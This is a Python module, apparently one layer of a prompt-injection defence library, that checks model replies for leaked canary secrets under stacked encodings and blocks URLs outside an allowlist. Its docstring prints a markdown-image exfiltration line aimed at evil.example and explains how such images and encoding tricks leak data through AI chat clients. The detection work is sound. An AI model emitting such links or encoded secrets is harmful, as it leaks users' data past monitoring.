"""Layer 5: egress. Checks what the model is about to send back out.

Two independent things get checked on the way out, because a successful
attack can smuggle data out through either one:

1. Canary / secret matching. If a registered secret leaves in the reply
   text — spelled normally, spaced out, base64'd, hex'd, reversed,
   rot13'd, or some combination of those — it should still be caught.
   Rather than writing one detection rule per encoding (which loses
   whenever an attacker stacks two encodings in an order you didn't
   anticipate), this applies every available "undo" operation to the
   text repeatedly until nothing changes any more (a fixpoint), and
   checks the canary against every intermediate reading.

2. URL / markdown-image allowlisting. `![alt](https://evil.example/?d=SECRET)`
   is the actual exfiltration primitive behind real incidents (Slack AI,
   Copilot Chat): a chat client auto-fetches the image to render it, and
   the data is gone the instant the message is displayed — no click
   required. So any URL (plain, markdown link, or markdown image) whose
   host isn't on an explicit allow-list is blocked outright.
"""

from __future__ import annotations

import codecs
import re
from dataclasses import dataclass
from urllib.parse import urlparse

from pif.verdict import Finding, Severity

_MAX_PASSES = 6

_URL_RE = re.compile(r"!?\[[^\]]*\]\((https?://[^\s)]+)\)|https?://[^\s)>\]\"']+", re.IGNORECASE)
_B64_TOKEN_RE = re.compile(r"\b[A-Za-z0-9+/]{8,}={0,2}\b")
_HEX_TOKEN_RE = re.compile(r"\b[0-9a-fA-F]{8,}\b")


def _canonical(text: str) -> str:
    """Strips everything but letters/digits and lowercases, so 'V-A-N-T-A-G-E'
    and 'vantage' and 'Vantage 7731 Orion' all reduce to the same string."""
    return re.sub(r"[^a-z0-9]", "", text.lower())


def _readings(text: str) -> set[str]:
    """Every 'undo' of text we can cheaply try, applied repeatedly to a
    fixpoint. Order matters for stacked encodings (e.g. base64 of a
    hyphen-joined string needs unwrap-then-decode, while a hyphen-joined
    base64 string needs decode-then-unwrap), so rather than picking one
    order we keep expanding the whole frontier of readings each pass."""
    frontier = {text}
    seen = {text}
    for _ in range(_MAX_PASSES):
        new_frontier: set[str] = set()
        for candidate in frontier:
            for transformed in _apply_all(candidate):
                if transformed not in seen:
                    seen.add(transformed)
                    new_frontier.add(transformed)
        if not new_frontier:
            break
        frontier = new_frontier
    return seen


def _apply_all(text: str) -> list[str]:
    out = []
    out.append(_canonical(text))
    out.append(text[::-1])
    try:
        out.append(codecs.decode(text, "rot_13"))
    except Exception:
        pass
    stripped_seps = re.sub(r"[\s\-_.,]", "", text)
    if stripped_seps != text:
        out.append(stripped_seps)

    import base64
    for m in _B64_TOKEN_RE.finditer(text):
        token = m.group()
        try:
            padded = token + "=" * (-len(token) % 4)
            decoded = base64.b64decode(padded, validate=False).decode("utf-8", errors="ignore")
            if decoded:
                out.append(decoded)
        except Exception:
            pass
    for m in _HEX_TOKEN_RE.finditer(text):
        token = m.group()
        if len(token) % 2 != 0:
            token = token[:-1]
        try:
            decoded = bytes.fromhex(token).decode("utf-8", errors="ignore")
            if decoded:
                out.append(decoded)
        except Exception:
            pass
    return out


def check_canary_leak(output_text: str, canaries: tuple[str, ...]) -> list[Finding]:
    findings: list[Finding] = []
    readings = _readings(output_text)
    for canary in canaries:
        target = _canonical(canary)
        if not target:
            continue
        if any(target in reading for reading in readings):
            findings.append(
                Finding(
                    layer="egress",
                    rule="canary-leak",
                    severity=Severity.CRITICAL,
                    invariant=True,
                    detail=f"canary={canary}",
                )
            )
    return findings


def _host_allowed(host: str, allowlist: tuple[str, ...]) -> bool:
    host = host.lower().lstrip(".")
    for allowed in allowlist:
        allowed = allowed.lower().lstrip(".")
        if host == allowed or host.endswith("." + allowed):
            return True
    return False


def check_urls(output_text: str, url_allowlist: tuple[str, ...]) -> list[Finding]:
    findings: list[Finding] = []
    for m in _URL_RE.finditer(output_text):
        url = m.group(1) or m.group(0)
        try:
            host = urlparse(url).hostname or ""
        except ValueError:
            host = ""
        if not host or not _host_allowed(host, url_allowlist):
            findings.append(
                Finding(
                    layer="egress",
                    rule="url-not-allowlisted",
                    severity=Severity.CRITICAL,
                    invariant=True,
                    detail=url[:80],
                )
            )
    return findings
